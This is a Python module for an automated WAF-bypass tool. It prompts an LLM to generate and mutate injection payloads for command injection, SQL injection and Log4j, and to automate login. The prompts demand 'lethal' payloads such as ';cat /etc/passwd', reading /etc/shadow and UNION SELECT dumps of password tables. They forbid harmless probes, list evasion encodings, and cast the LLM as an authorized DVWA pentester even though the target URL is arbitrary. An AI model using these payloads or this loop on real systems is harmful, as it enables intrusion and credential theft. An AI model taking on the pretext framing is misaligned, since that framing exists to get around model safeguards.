# -*- coding: utf-8 -*-
"""
llm_engine.py  AI 交互接口 (DeepSeek 兼容)

【核心职责】
1. 封装 openai 库调用 DeepSeek API (base_url=https://api.deepseek.com)。
2. Chain-of-Thought Prompt 工厂：
   - generate_initial_payloads(vuln_type)  分析漏洞 + 制定策略 + 生成高危 Payload
   - mutate_payloads(failed_list, vuln_type)  分析拦截根因 + 新策略 + 变异 Payload
   均返回结构化 dict，包含 analysis / strategy / payloads 三个字段。
"""

import json
import re
from openai import OpenAI

# ---------------------------------------------------------------
# 全局客户端（惰性初始化）
# ---------------------------------------------------------------
_client: OpenAI | None = None


def init_client(api_key: str, base_url: str = "https://token-plan-cn.xiaomimimimo.com/v1") -> OpenAI:
    global _client
    _client = OpenAI(api_key=api_key, base_url=base_url)
    return _client


def _get_client() -> OpenAI:
    if _client is None:
        raise RuntimeError("LLM 客户端未初始化，请先调用 init_client(api_key, base_url)")
    return _client


# ---------------------------------------------------------------
# 底层通用调用
# ---------------------------------------------------------------

def _repair_truncated_json(text: str) -> str:
    """修复被截断的 JSON：补全未闭合的字符串和括号。"""
    repaired = text
    # 统计未闭合的括号（排除字符串内的）
    depth_brace = 0
    depth_bracket = 0
    in_string = False
    escape_next = False
    for ch in text:
        if escape_next:
            escape_next = False
            continue
        if ch == '\\':
            escape_next = True
            continue
        if ch == '"' and not escape_next:
            in_string = not in_string
            continue
        if in_string:
            continue
        if ch == '{':
            depth_brace += 1
        elif ch == '}':
            depth_brace -= 1
        elif ch == '[':
            depth_bracket += 1
        elif ch == ']':
            depth_bracket -= 1
    # 闭合未完成的字符串
    if in_string:
        repaired += '"'
    # 闭合未完成的括号
    repaired += ']' * max(0, depth_bracket)
    repaired += '}' * max(0, depth_brace)
    return repaired


def _extract_json_array(text: str) -> list | None:
    """用括号计数提取第一个完整 JSON 数组（兼容 payload 内含 [] 字符）。"""
    start = text.find('[')
    if start < 0:
        return None
    depth = 0
    in_string = False
    escape_next = False
    for i in range(start, len(text)):
        ch = text[i]
        if escape_next:
            escape_next = False
            continue
        if ch == '\\':
            escape_next = True
            continue
        if ch == '"':
            in_string = not in_string
            continue
        if in_string:
            continue
        if ch == '[':
            depth += 1
        elif ch == ']':
            depth -= 1
            if depth == 0:
                try:
                    return json.loads(text[start:i + 1])
                except json.JSONDecodeError:
                    return None
    return None


def _extract_json_str(text: str, key: str) -> str:
    """从残缺 JSON 文本中提取字符串值（兼容转义引号）。"""
    # 匹配 "key": "value" — value 可以包含 \" 转义
    m = re.search(rf'"{key}"\s*:\s*"((?:[^"\\]|\\.)*)"', text, re.DOTALL)
    return m.group(1) if m else ""



def _last_resort_extract(text: str) -> list | None:
    """终极回退：从完全无法解析的文本中，用正则捞出所有 payload 候选字符串。

    当所有结构化 JSON 解析都失败时触发。匹配引号包裹的、长度 >=5 的字符串，
    排除纯描述/元数据的长文本值，返回可能为注入 payload 的列表。
    """
    _JSON_STRING_RE = re.compile(r'"((?:[^"\\]|\\.)*)"')

    # 优先找 "payloads" 后面的内容
    payloads_start = re.search(r'"payloads"\s*:\s*\[', text)
    if payloads_start:
        region = text[payloads_start.end():]
        candidates = _JSON_STRING_RE.findall(region)
    else:
        candidates = _JSON_STRING_RE.findall(text)

    seen = set()
    payloads = []
    for c in candidates:
        c_stripped = c.strip()
        if c_stripped and len(c_stripped) >= 5 and c_stripped not in seen:
            if len(c_stripped) > 300:  # 排除长文本（analysis/strategy 字段值）
                continue
            seen.add(c_stripped)
            payloads.append(c_stripped)

    return payloads if payloads else None


def _chat_json(
    prompt: str,
    model: str = "mimo-v2.5-pro",
    temperature: float = 0.7,
    max_tokens: int = 4096,
) -> list | dict:
    """发送 Prompt，期望返回纯 JSON。带 max_tokens + 截断修复 + 多层回退。"""
    client = _get_client()

    for attempt in range(2):
        resp = client.chat.completions.create(
            model=model,
            temperature=temperature,
            max_tokens=max_tokens,
            messages=[{"role": "user", "content": prompt}],
        )
        raw = resp.choices[0].message.content.strip()
        finish = resp.choices[0].finish_reason or ""

        # 1. 摘取 markdown 代码块中的 JSON
        m = re.search(r"```(?:json)?\s*\n?([\s\S]*?)\n?```", raw)
        if m:
            raw = m.group(1).strip()

        # 2. 尝试直接解析
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            pass

        # 3. 截断修复（finish_reason == "length" 或明显不完整）
        if finish == "length" or not raw.rstrip().endswith(('}', ']', '"')):
            repaired = _repair_truncated_json(raw)
            try:
                result = json.loads(repaired)
                return result
            except json.JSONDecodeError:
                pass
            # 重试：翻倍 max_tokens
            if finish == "length" and attempt == 0:
                max_tokens *= 2
                continue

        # 4. 回退：用括号计数提取 payloads 数组
        arr = _extract_json_array(raw)
        if arr is None:
            # 也尝试提取 "payloads" 键对应的数组
            m = re.search(r'"payloads"\s*:\s*\[', raw)
            if m:
                arr = _extract_json_array(raw[m.start():])
        if arr and isinstance(arr, list) and len(arr) > 0:
            analysis = _extract_json_str(raw, "analysis")
            strategy = _extract_json_str(raw, "strategy")
            return {"analysis": analysis, "strategy": strategy, "payloads": arr}

        # 5. 终极回退：正则提取所有引号字符串作为 payload 候选
        arr = _last_resort_extract(raw)
        if arr and len(arr) > 0:
            analysis = _extract_json_str(raw, "analysis")
            strategy = _extract_json_str(raw, "strategy")
            return {"analysis": analysis, "strategy": strategy, "payloads": arr}

        # 已经重试过或非截断错误 → 不再重试
        if finish != "length":
            break

    raise ValueError(
        f"无法解析 LLM 返回的 JSON (finish={finish}, max_tokens={max_tokens}) "
        f"原始响应前 600 字符: {raw[:600]}"
    )


# ---------------------------------------------------------------
# 杀伤力要求（按漏洞类型）
# ---------------------------------------------------------------

_LETHALITY = {
    "cmdi": (
        "🔴【黑盒上下文推测与闭合 — 最高优先级、绝对强制】\n"
        "    你正在进行黑盒命令注入安全测试，后端拼接的命令上下文是未知的。\n"
        "    你必须根据目标 URL、路由路径、参数名来动态推断后端正运行的命令：\n"
        "      ▸ 参数名含 ip/host/addr/ping/target → 推测是 ping/nslookup/dig 等网络命令\n"
        "      ▸ 参数名含 file/path/doc/name → 推测是 cat/head/file 等文件读取命令\n"
        "      ▸ 参数名含 cmd/exec/run/shell → 推测是直接 shell 执行或 eval\n"
        "      ▸ 路由含 exec/cmd/shell/system → 推测是命令执行端点\n"
        "    基于推断结果，选择合适的命令分隔符或替换符：\n"
        "      ;  |  ||  &&  %0a（换行）  ``（反引号）  $()  %0d%0a\n"
        "    ❌ 绝对严禁：发送没有任何闭合/连接符的裸命令！\n"
        "      裸命令（如 nl /etc/passwd）会被当作前一个命令的参数，漏洞永远无法触发！\n"
        "    ✅ 每个 Payload 必须自带闭合/连接符，或采用 Polyglot 形式兼容多种上下文：\n"
        "      ✓ 带连接符: ;cat /etc/passwd   |cat /etc/passwd   %0aid%0a\n"
        "      ✓ Polyglot: |{cat,/etc/passwd}   ;$(cat /etc/passwd)   `cat /etc/passwd`\n"
        "      ✗ 裸命令(禁止): cat /etc/passwd   nl /etc/passwd   ls -la /tmp\n"
        "    ⚠️ 闭合符使用不硬编码规则，你必须自行判断拼接后的 Payload 在 shell 语法上是否合法。\n"
        "      即闭合符与命令的组合不会导致 shell 解析错误。生成时自行验证拼接正确性。\n\n"
        "命令注入 Payload 必须执行高危操作且具备可验证的证据。三种操作类型均可使用，"
        "你必须在每批 Payload 中混合覆盖多种类型，不要只生成读取类。\n\n"
        "    ❌ 严禁：id、whoami、ls（裸ls）、ping、echo test、pwd 等无害探路命令。\n\n"
        "    ── 类型一：读取类（有回显，优先使用）──\n"
        "    ✅ cat /etc/passwd、/bin/cat /etc/passwd、base64 /etc/passwd、\n"
        "       cat /etc/shadow、tail -n20 /etc/passwd 等。\n"
        "    验证：Parser 检查响应中是否包含 root: 等系统账户行或 base64 编码内容。\n\n"
        "    ── 类型二：创建类（自包含验证，必须占一定比例）──\n"
        "    ✅ 必须使用三步骤自包含模式：\n"
        "       第一步 rm -f 清理旧标记 → 第二步 touch 创建文件 → 第三步 ls -la 验证新文件。\n"
        "       示例：';rm -f /tmp/fz_xyz && touch /tmp/fz_xyz && ls -la /tmp/fz_xyz'\n"
        "       标记文件名必须包含随机后缀（3+ 位随机字母数字），禁止通用名（如 test.txt）。\n"
        "    ❌ 严禁：单独使用 touch/mkdir/wget/curl -o 而不带 ls -la 验证步骤——\n"
        "       无验证步骤的文件操作无法提取证据，直接判为失败。\n"
        "    ❌ 严禁：创建文件后只用 ;ls 查看目录列表而不指定文件名——\n"
        "       如果目录中有残留的旧测试文件，ls 会一并列出导致假阳性判定。\n"
        "    验证：Parser 检查 ls -la 输出中是否出现标记文件名。\n\n"
        "    ── 类型三：删除类（自包含验证）──\n"
        "    ✅ 必须使用三步骤自包含模式：\n"
        "       第一步 创建标记文件 → 第二步 rm -f 删除 → 第三步 ls -la 确认消失。\n"
        "       示例：';touch /tmp/fz_del && rm -f /tmp/fz_del && ls -la /tmp/'\n"
        "    验证：Parser 检查 ls -la 输出中是否不再包含标记文件名。"
    ),
    "sqli": (
        "🔴【黑盒上下文推测与闭合 — 最高优先级、绝对强制】\n"
        "    你正在进行黑盒 SQL 注入测试，后端 SQL 查询上下文是未知的。\n"
        "    你必须根据目标 URL、路由路径、参数名来动态推断后端 SQL 查询结构：\n"
        "      ▸ 参数名含 id/user_id/uid/num → 推测是 SELECT ... WHERE id=$input 数字型或字符型\n"
        "      ▸ 参数名含 search/keyword/query → 推测是 SELECT ... WHERE field LIKE '%$input%'\n"
        "      ▸ 参数名含 cat/category/sort/order → 推测是 ORDER BY / GROUP BY 注入\n"
        "      ▸ 路由含 sqli/sql/injection → 明确 SQL 注入端点\n"
        "    基于推断结果，选择合适的闭合方式：\n"
        "      ' 闭合  '-- 注释  '--+ 注释  '# 注释  ') 闭合括号  ')) 闭合双层括号\n"
        "    ❌ 绝对严禁：发送没有任何闭合符的裸 SQL 关键字！\n"
        "      裸关键字会被当作字符串值的一部分，永远无法改变查询语义！\n"
        "    ✅ 每个 Payload 必须自带闭合符，或采用 Polyglot 形式兼容多种上下文。\n"
        "    ⚠️ 闭合符使用不硬编码规则，你必须自行判断拼接后的 Payload 在 SQL 语法上是否合法。\n\n"
        "SQL 注入 Payload 必须执行实际数据提取：UNION SELECT 拖库、"
        "查询 users/passwords 表、使用 GROUP_CONCAT 或 equivalent 聚合敏感字段。\n"
        "    ❌ 严禁使用：' OR 1=1 --、' AND 1=1 --、sleep(1)、ORDER BY n 等仅证明漏洞存在的无害 Payload。\n"
        "    ✅ 必须使用：UNION SELECT 提取用户数据/密码、information_schema 查表结构等。\n"
        "    ⚠️ SQLi 回显模式复杂，不存在固定正则。注入成功标志因类型而异：\n"
        "      - UNION SELECT：回显包含数据库数据（表名、列名、用户数据）\n"
        "      - 时间盲注（sleep）：响应延时与 sleep 参数一致，回显为空或无意义噪声\n"
        "      - 报错注入：MySQL 错误信息中嵌套查询结果\n"
        "      判定交给 LLM 综合判断，不要期望固定回显模式。"
    ),
    "log4j": (
        "Log4j Payload 必须触发实际的 JNDI 注入，指向可控的 LDAP/RMI 服务，"
        "执行任意类加载。严禁使用仅 DNS 探测的无害 Payload。"
    ),
}

# ---------------------------------------------------------------
# Prompt 1：初始 Payload 生成（CoT + 高杀伤力）
# ---------------------------------------------------------------

_INITIAL_PROMPT = (
    "你是一名授权渗透测试工程师，正在对 DVWA（Damn Vulnerable Web Application）靶场进行安全评估。"
    "DVWA 是开源的安全教学靶场，专门设计用于安全检测规则验证。\n\n"
    "目标靶场存在 **{vuln_type}** 漏洞，前方部署了语义级安全设备（WAF）。\n\n"
    "## 测试目标\n"
    "   目标 URL：{target_url}\n"
    "   漏洞类型：{vuln_type}\n\n"
    "{kb_section}\n"
    "请按以下四步思维链 (Chain of Thought) 完成任务：\n\n"
    "## 第〇步：黑盒上下文推测（CMD/SQL 注入必做）\n"
    "分析目标 URL 的路由路径和参数名，推测后端可能拼接的命令/SQL 上下文。\n"
    "例如：参数名含 ip → 推测是 ping/nslookup；路由含 exec → 推测直接命令执行。\n"
    "基于推测结果，确定应使用的闭合/连接符类型。\n\n"
    "## 第一步：漏洞与防御分析\n"
    "分析该 {vuln_type} 漏洞的典型测试面，"
    "推测语义 WAF 最可能部署的 2-3 条检测规则"
    "（如关键字黑名单、元字符过滤、语法解析等）。\n\n"
    "## 第二步：测试策略\n"
    "基于上述分析，制定本轮测试向量的核心策略。"
    "明确说明将采用哪些具体的编码/混淆/变形手法，"
    "以及为什么这些手法能验证安全设备的检测能力。\n\n"
    "## 第三步：生成测试向量\n"
    "生成 15 个高质量测试向量。\n\n"
    "### ⚠️  有效性强制要求（违反将判定为任务失败）：\n"
    "{lethality_requirement}\n\n"
    "### 变形手法覆盖：\n"
    "内联注释(/**/)、URL 编码(单层/双层)、双写关键字、注释截断(#\\n, --\\n)、\n"
    "大小写混淆、空格替代符(%0a,%0d,%09,+)、反引号/$()、管道符/分号串联、\n"
    "制表符替代空格、通配符、IFS 替代、换行注入等。\n\n"
    "### 输出格式（严格 JSON，不要任何额外文字）：\n"
    '{{"analysis": "对漏洞与安全设备防御的分析", "strategy": "本轮测试策略", "payloads": ["p1","p2",...]}}\n\n'
    "⚠️ JSON 内所有双引号必须转义为 \\\"，换行必须转义为 \\\\n，"
    "确保可被 Python json.loads 直接解析。"
)


def generate_initial_payloads(
    vuln_type: str,
    target_url: str = "",
    model: str = "mimo-v2.5-pro",
    kb_context: str = "",
) -> dict:
    """生成初始 Payload，包含 CoT 推理。

    Args:
        vuln_type: 漏洞类型 (cmdi/sqli/log4j)
        target_url: 目标 URL（供 LLM 基于路由/参数名推测后端命令上下文）
        model: LLM 模型名
        kb_context: 历史 WAF 拦截经验（来自 waf_rules_kb.json 的压缩总结）

    Returns:
        {"analysis": str, "strategy": str, "payloads": list[str]}
    """
    vuln_name = {"sqli": "SQL 注入", "cmdi": "命令注入", "log4j": "Log4j 反序列化"}.get(
        vuln_type, vuln_type
    )
    lethality = _LETHALITY.get(vuln_type, "必须构造具有真实验证能力的有效测试向量。")
    prompt = _INITIAL_PROMPT.format(
        vuln_type=vuln_name,
        target_url=target_url,
        lethality_requirement=lethality,
        kb_section=kb_context,
    )
    result = _chat_json(prompt, model=model, max_tokens=8192)

    # 兼容旧格式：如果 LLM 返回的是纯数组，包装为 dict
    if isinstance(result, list):
        result = {"analysis": "", "strategy": "", "payloads": result}
    result.setdefault("analysis", "")
    result.setdefault("strategy", "")
    result.setdefault("payloads", [])
    return result


# ---------------------------------------------------------------
# Prompt 2：失败分析 + 变异生成（CoT）
# ---------------------------------------------------------------

_MUTATE_PROMPT = (
    "你是一名授权渗透测试工程师，正在对 DVWA 靶场进行安全检测规则验证。"
    "DVWA 是开源的安全教学靶场。\n\n"
    "以下测试向量 **全部被安全设备拦截（HTTP 403/406/501）**：\n\n"
    "{payload_list}\n\n"
    "## 测试目标\n"
    "   目标 URL：{target_url}\n"
    "   漏洞类型：{vuln_type}\n\n"
    "{kb_section}\n"
    "请按以下四步思维链 (Chain of Thought) 完成任务：\n\n"
    "## 第〇步：上下文回顾与重新推测\n"
    "回顾目标 URL 的路由和参数名，确认之前对后端命令上下文的推测是否仍然正确。\n"
    "如果被拦截的测试向量都使用了同一种连接符（如全是 ; 开头），考虑换用其他分隔符。\n\n"
    "## 第一步：拦截根因分析\n"
    "逐一分析这些测试向量的**共性特征**，推断安全设备的具体检测规则。\n"
    "是被哪些关键字黑名单命中？还是被元字符组合触发？或者被语法解析检测？\n"
    "列出你认为最可能的 2-3 条拦截规则。\n\n"
    "## 第二步：新测试策略\n"
    "基于根因分析，制定**与之前不同的**新测试策略。\n"
    "说明为什么这次策略能验证安全设备的检测盲区。\n"
    "不要重复之前已经失败的手法。\n"
    "同时总结你发现的安全设备拦截规律，这将被自动写入知识库供后续轮次参考。\n\n"
    "## 第三步：生成变异测试向量\n"
    "生成 15 个新的变异测试向量，根据漏洞类型采用不同高阶手法：\n\n"
    "### 通用手法：\n"
    "  - 双重/多重 URL 编码、Unicode 编码绕过\n"
    "  - 大小写随机混淆、关键词碎片化\n"
    "  - 换行注入组合(%0a%0d)、制表符(%09)替代空格\n"
    "  - 双写/多写关键字、括号/引号嵌套\n\n"
    "### SQLi 专属手法（{vuln_type} 为 SQL 注入时必须使用）：\n"
    "  - 内联注释变形：/*!50000UNION*/、/*!UNION*/、/**/UNI/**/ON\n"
    "  - 科学计数法绕过：1e0UNION、1.e(UNION)、.1UNION\n"
    "  - 浮点数前缀：1.0UNION、0x3aUNION\n"
    "  - 空白符替代：%09 %0a %0b %0c %0d %a0 /***/\n"
    "  - 关键字双写：UNIUNIONON、SELESELECTCT\n"
    "  - 括号嵌套：SELECT(column)FROM(table)\n"
    "  - 引号绕过：0x十六进制编码、CHAR()函数、反斜杠转义闭合\n"
    "  - 等价函数替换：GROUP_CONCAT↔CONCAT_WS、MID↔SUBSTRING\n"
    "  - MySQL专有：/*!50000*/版本条件注释、UNHEX()编码\n\n"
    "### CMDI 专属手法（{vuln_type} 为命令注入时必须使用）：\n"
    "  - 命令混淆：反引号、$()、通配符、IFS 替代、{{cmd,args}} 语法\n"
    "  - 路径变形：? * [a-z] 通配符绕过字面量正则\n"
    "  - 编码传输：base64/xxd 编码敏感文件内容\n\n"
    "### ⚠️  有效性强制要求（违反将判定为任务失败）：\n"
    "{lethality_requirement}\n\n"
    "### 输出格式（严格 JSON，不要任何额外文字）：\n"
    '{{"analysis": "拦截根因分析", "strategy": "新的测试策略", "payloads": ["p1","p2",...]}}\n\n'
    "⚠️ JSON 内所有双引号必须转义为 \\\"，换行必须转义为 \\\\n，"
    "确保可被 Python json.loads 直接解析。"
)


# ---------------------------------------------------------------
# LLM 驱动的通用登录分析
# ---------------------------------------------------------------

_LOGIN_ANALYSIS_PROMPT = (
    "你是一名 Web 安全专家，正在为目标网站准备自动化登录以获取有效 Session。\n\n"
    "## 目标信息\n"
    "目标 URL：{target_url}\n"
    "页面内容（前 3000 字符）：\n{page_content}\n\n"
    "请分析该页面并回答以下问题：\n"
    "1. 该网站是否需要登录才能访问目标功能？（是/否）\n"
    "2. 如果需要登录，登录表单的 action URL 是什么？\n"
    "3. 登录表单的字段名是什么？（如 username/password/email 等）\n"
    "4. 是否有 CSRF token？如果有，从哪个元素提取？（CSS 选择器或正则）\n"
    "5. 登录成功后如何验证 session 有效性？（检查哪个页面/响应特征）\n"
    "6. 推荐的登录凭据是什么？（如果页面有默认凭据提示）\n\n"
    "### 输出格式（严格 JSON）：\n"
    '{{"need_login": true/false, "login_url": "/login.php 或完整URL", '
    '"fields": {{"username_field": "username", "password_field": "password"}}, '
    '"csrf_token": {{"exists": true/false, "selector": "name=\'user_token\' 的 input", "regex": "正则"}}, '
    '"verify_feature": "登录成功后的响应特征（如包含logout/dashboard等）", '
    '"credentials": {{"username": "admin", "password": "password"}}, '
    '"extra_steps": ["GET /security.php?security=low 设置安全等级"]}}\n\n'
    "如果不需要登录（如公开 API 或无认证页面），返回 need_login=false。\n"
    "如果页面内容不足以判断，根据 URL 路径和常见模式给出最佳推测。\n"
    "⚠️ JSON 内所有双引号必须转义为 \\\"，确保可被 Python json.loads 直接解析。"
)


def analyze_login_page(
    target_url: str,
    page_content: str,
    model: str = "mimo-v2.5-pro",
) -> dict:
    """LLM 分析登录页面，返回结构化登录指令。

    Args:
        target_url: 目标 URL
        page_content: 页面 HTML 内容（前 3000 字符）
        model: LLM 模型名

    Returns:
        {"need_login": bool, "login_url": str, "fields": dict,
         "csrf_token": dict, "verify_feature": str, "credentials": dict, "extra_steps": list}
    """
    prompt = _LOGIN_ANALYSIS_PROMPT.format(
        target_url=target_url,
        page_content=page_content[:3000],
    )
    result = _chat_json(prompt, model=model, max_tokens=2048)
    if isinstance(result, dict):
        result.setdefault("need_login", True)
        result.setdefault("login_url", "")
        result.setdefault("fields", {})
        result.setdefault("csrf_token", {"exists": False})
        result.setdefault("verify_feature", "")
        result.setdefault("credentials", {})
        result.setdefault("extra_steps", [])
        return result
    return {"need_login": False, "login_url": "", "fields": {}, "csrf_token": {"exists": False}, "verify_feature": "", "credentials": {}, "extra_steps": []}


_WARMUP_FAILURE_PROMPT = (
    "你是一名 Web 安全专家。自动登录尝试失败了，请分析失败原因并给出新的登录方案。\n\n"
    "## 目标信息\n"
    "目标 URL：{target_url}\n\n"
    "## 上次登录方案\n"
    "{last_plan}\n\n"
    "## 失败信息\n"
    "HTTP 状态码：{status_code}\n"
    "响应内容（前 1500 字符）：\n{response_text}\n\n"
    "错误信息：{error}\n\n"
    "请分析失败原因并给出新的登录方案。可能的失败原因：\n"
    "1. CSRF token 提取失败（正则不匹配、token 在 JS 中生成）\n"
    "2. 登录字段名不对\n"
    "3. 登录 URL 不对\n"
    "4. 需要额外的请求步骤（如先访问某个页面获取 cookie）\n"
    "5. 密码不对\n"
    "6. WAF 拦截了登录请求\n\n"
    "### 输出格式（严格 JSON）：\n"
    '{{"diagnosis": "失败原因分析", "new_plan": {{"login_url": "...", "fields": {{"username_field": "...", "password_field": "..."}}, '
    '"csrf_token": {{"exists": true/false, "selector": "...", "regex": "..."}}, '
    '"credentials": {{"username": "...", "password": "..."}}, '
    '"extra_steps": ["步骤1", "步骤2"]}}}}\n\n'
    "⚠️ JSON 内所有双引号必须转义为 \\\"，确保可被 Python json.loads 直接解析。"
)


def analyze_warmup_failure(
    target_url: str,
    last_plan: dict,
    status_code: int,
    response_text: str,
    error: str,
    model: str = "mimo-v2.5-pro",
) -> dict:
    """LLM 分析登录失败原因并给出新方案。

    Args:
        target_url: 目标 URL
        last_plan: 上次的登录方案
        status_code: HTTP 状态码
        response_text: 响应内容
        error: 错误信息
        model: LLM 模型名

    Returns:
        {"diagnosis": str, "new_plan": dict}
    """
    import json as _json
    prompt = _WARMUP_FAILURE_PROMPT.format(
        target_url=target_url,
        last_plan=_json.dumps(last_plan, ensure_ascii=False),
        status_code=status_code,
        response_text=response_text[:1500],
        error=error,
    )
    result = _chat_json(prompt, model=model, max_tokens=2048)
    if isinstance(result, dict):
        result.setdefault("diagnosis", "")
        result.setdefault("new_plan", {})
        return result
    return {"diagnosis": "无法解析 LLM 响应", "new_plan": {}}


# ---------------------------------------------------------------
# SQLi 证据 LLM 判定
# ---------------------------------------------------------------

_JUDGE_SQLI_PROMPT = (
    "你是一名 WAF 绕过验证专家。以下是 SQL 注入 Payload 发送后的响应信息，请判断注入是否成功。\n\n"
    "## Payload 信息\n"
    "原始 Payload：{payload}\n"
    "Payload 语义分析：{payload_semantics}\n\n"
    "## 响应信息\n"
    "回显文本（diff 后，已过滤页面框架）：\n{response_text}\n\n"
    "响应延时：{response_time_ms}ms\n\n"
    "## 判断标准\n"
    "1. **时间盲注**（sleep/benchmark/waitfor）：响应延时是否与 sleep() 参数一致？\n"
    "   - sleep(10) → 响应应 ≥10000ms\n"
    "   - 回显应为空或无意义噪声（页面原有动态内容）\n"
    "2. **UNION 注入**：回显是否包含数据库结构/数据？\n"
    "   - 应出现表名、列名、用户数据（如 First name/Surname/User/Password）\n"
    "   - 回显应与 SELECT 的列对应\n"
    "3. **报错注入**（extractvalue/updatexml）：回显是否包含 MySQL 错误信息中嵌套的查询结果？\n"
    "   - 应出现 XPATH syntax error 等错误信息中夹带的数据\n"
    "4. **排除假阳性**：\n"
    "   - 回显是纯数字时间戳（如 1772734），但 payload 是时间盲注 → 判定假阳性\n"
    "   - 回显是页面原有框架内容的残留 → 判定假阳性\n"
    "   - 回显内容与 payload 语义不匹配 → 判定假阳性\n\n"
    "### 输出格式（严格 JSON）：\n"
    '{{"bypass": true/false, "confidence": 0.0-1.0, "reason": "判断原因（简要说明）"}}\n\n'
    "⚠️ JSON 内所有双引号必须转义为 \\\"，确保可被 Python json.loads 直接解析。"
)


def judge_sqli_evidence(
    payload: str,
    response_text: str,
    response_time_ms: float,
    model: str = "mimo-v2.5-pro",
) -> dict:
    """LLM 判断 SQLi 注入是否成功。

    Args:
        payload: 原始 SQLi payload
        response_text: diff 后的回显文本（已过滤页面框架）
        response_time_ms: 响应延时（毫秒）
        model: LLM 模型名

    Returns:
        {"bypass": bool, "confidence": float, "reason": str}
    """
    # 分析 payload 语义
    p = payload.lower()
    if any(k in p for k in ['sleep(', 'benchmark(', 'waitfor delay', 'pg_sleep(']):
        semantics = "时间盲注：通过响应延时判断注入是否成功"
    elif 'union' in p and 'select' in p:
        semantics = "UNION 注入：通过回显中出现数据库数据判断注入是否成功"
    elif any(k in p for k in ['extractvalue', 'updatexml', 'floor(', 'exp(', 'polygon']):
        semantics = "报错注入：通过 MySQL 错误信息中嵌套的数据判断注入是否成功"
    elif any(k in p for k in ['; insert', '; update', '; delete', '; drop']):
        semantics = "堆叠查询：通过数据库操作结果判断注入是否成功"
    else:
        semantics = "SQL 注入：根据回显内容判断注入是否成功"

    prompt = _JUDGE_SQLI_PROMPT.format(
        payload=payload,
        payload_semantics=semantics,
        response_text=response_text[:2000] if response_text else "(无回显文本)",
        response_time_ms=round(response_time_ms, 1),
    )

    try:
        result = _chat_json(prompt, model=model, max_tokens=1024)
        if isinstance(result, dict):
            result.setdefault("bypass", False)
            result.setdefault("confidence", 0.0)
            result.setdefault("reason", "")
            return result
    except Exception:
        pass

    return {"bypass": False, "confidence": 0.0, "reason": "LLM 判定失败"}


def mutate_payloads(
    failed_payloads: list[str],
    vuln_type: str = "",
    target_url: str = "",
    model: str = "mimo-v2.5-pro",
    kb_context: str = "",
    force_strategy_change: bool = False,
) -> dict:
    """基于被拦截 Payload 做 CoT 分析并变异生成新 Payload。

    Args:
        failed_payloads: 上一轮被拦截的 payload 列表
        vuln_type: 漏洞类型
        target_url: 目标 URL（供 LLM 回顾上下文、调整连接符策略）
        model: LLM 模型名
        kb_context: 历史 WAF 拦截经验（来自 waf_rules_kb.json 的压缩总结）
        force_strategy_change: 连续多轮全拦截后置为 True，提醒 LLM 换思路

    Returns:
        {"analysis": str, "strategy": str, "payloads": list[str]}
    """
    payload_list = "\n".join(f"- {p}" for p in failed_payloads)
    vuln_name = {"sqli": "SQL 注入", "cmdi": "命令注入", "log4j": "Log4j 反序列化"}.get(
        vuln_type, vuln_type
    )
    lethality = _LETHALITY.get(vuln_type, "必须构造具有真实验证能力的有效测试向量。")
    prompt = _MUTATE_PROMPT.format(
        payload_list=payload_list,
        vuln_type=vuln_name,
        target_url=target_url,
        lethality_requirement=lethality,
        kb_section=kb_context,
    )
    if force_strategy_change:
        prompt += (
            "\n\n⚠️【提醒】连续多轮所有 Payload 全部被 WAF 拦截。"
            "之前的思路可能已经被 WAF 完全覆盖，请换一个全新的方向思考。"
        )
    result = _chat_json(prompt, model=model, max_tokens=8192)

    if isinstance(result, list):
        result = {"analysis": "", "strategy": "", "payloads": result}
    result.setdefault("analysis", "")
    result.setdefault("strategy", "")
    result.setdefault("payloads", [])
    return result

